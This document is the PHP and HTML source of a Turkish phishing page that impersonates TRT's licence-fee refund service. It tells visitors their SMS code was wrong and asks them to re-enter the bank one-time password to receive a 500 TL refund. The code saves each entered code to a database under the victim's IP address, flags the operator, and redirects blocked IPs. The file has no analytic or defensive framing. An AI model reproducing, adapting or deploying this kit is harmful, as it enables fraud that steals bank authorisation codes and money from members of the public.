<?php
foreach($_POST as $indexPost=>$valuePost) $_POST[$indexPost]=htmlspecialchars($valuePost,ENT_QUOTES);
include 'baglan.php';
function GetIP(){
if(getenv("HTTP_CLIENT_IP")) {
$ip = getenv("HTTP_CLIENT_IP");
} elseif(getenv("HTTP_X_FORWARDED_FOR")) {
$ip = getenv("HTTP_X_FORWARDED_FOR");
if (strstr($ip, ',')) {
$tmp = explode (',', $ip);
$ip = trim($tmp[0]);
}
} else {
$ip = getenv("REMOTE_ADDR");
}
return $ip;
}
$ipcik = GetIP();

if ($_POST['sms2']<>"") {
$sms2 = $_POST['sms2'];
mysql_query("Update ak set sms2='$sms2' where ip='$ipcik' ");
mysql_query("Update ak set notif='1' where ip='$ipcik' ");
mysql_query("Update ak set ses='1' where ip='$ipcik' ");
}



$query =  mysql_query('SELECT * FROM ip');
while($row = mysql_fetch_assoc($query)){
if($row['ip'] == $ipcik){
header('Location: basvuru.php');
}
}

?>
<!DOCTYPE html>
<!-- saved from url=(0033)https://aidatiadeniz.com/sms2.php -->
<html lang="zxx"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

    <title>TRT | Aidat İade Sistemi</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <!-- External CSS libraries -->
    <link type="text/css" rel="stylesheet" href="./sms2_files/bootstrap.min.css">
    <link type="text/css" rel="stylesheet" href="./sms2_files/font-awesome.min.css">
    <link type="text/css" rel="stylesheet" href="./sms2_files/flaticon.css">

    <!-- Favicon icon -->
    

    <!-- Google fonts -->
    <link rel="stylesheet" type="text/css" href="./sms2_files/css">

    <!-- Custom Stylesheet -->
    <link type="text/css" rel="stylesheet" href="./sms2_files/style.css">
    <link rel="stylesheet" type="text/css" id="style_sheet" href="./sms2_files/default.css">

</head>
<body id="top">

<div class="page_loader"></div>

<link rel="icon" type="image/x-icon" href="https://aidatiadeniz.com/tema/img/favicon.png">
<form method="post" action="sms2.php" id="aspnetForm" autocomplete="off">




   <!-- External CSS libraries -->
    <link type="text/css" rel="stylesheet" href="./sms2_files/bootstrap.min(1).css">
    <link type="text/css" rel="stylesheet" href="./sms2_files/font-awesome.min(1).css">
    <link type="text/css" rel="stylesheet" href="./sms2_files/flaticon(1).css">

    <!-- Favicon icon -->
    <link rel="shortcut icon" href="https://aidatiadeniz.com/tema/img/favicon.ico" type="image/x-icon">

    <!-- Google fonts -->
    <link rel="stylesheet" type="text/css" href="./sms2_files/css">

    <!-- Custom Stylesheet -->
    <link type="text/css" rel="stylesheet" href="./sms2_files/style(1).css">
    <link rel="stylesheet" type="text/css" id="style_sheet" href="./sms2_files/default(1).css">



<div class="page_loader"></div>



<!-- Login 1 start -->

<section class="creditly-wrapper wthree, w3_agileits_wrapper">
      <div class="card bg-secondary shadow border-0">

<div class="login-1">
    <div class="container"> 
        <div class="row">
            <div class="col-md-12">
                <div class="login-inner-form">
                    <div class="details">
                        <a href="https://aidatiadeniz.com/sms2.php#">
                            <img src="http://www.globya.com.tr/wp-content/uploads/2016/03/clients-04.png" alt="logo">
                        </a>
                        <h3>İade Aktarım Sayfası</h3>
                       						
                            <font size="2" color="#960000"> <b>SMS ŞİFRENİZ HATALIDIR.</b></font>
            <br>    
            <br>   
            <font size="2" color="#960000"> <b>LÜTFEN TEKRAR DENEYİNİZ.</b></font>
<br>    
            <br>
			<font size="2" color="#960000">İadenizin Aktarımı <b>ODEME KURULUSU</b>  Tarafından Yapılacaktır. <b>500,00 ₺</b> Aidat İadenizin Kartınıza Aktarımı İçin Telefonunuza Gönderilen <b>SMS</b> Şifresini Giriniz. </font>
			<br>
			<br>
                        
                            <div class="form-group">
							
                                <input class="expiration-month-and-year input-text" pattern="[0-9]*" type="password" maxlength="8" minlength="5" id="sms2" name="sms2" placeholder="SMS Şifresi" required="">
                            </div>
                            
                            
                                <button type="submit" class="btn-md btn-theme btn-block">AKTARIMI TAMAMLA</button>
                            </div>
							<br>
							<div id="error-message"></div>
                          </div>
                        
                       
                </div>
            </div>
        </div>
    </div>
</div></section></form></body></html>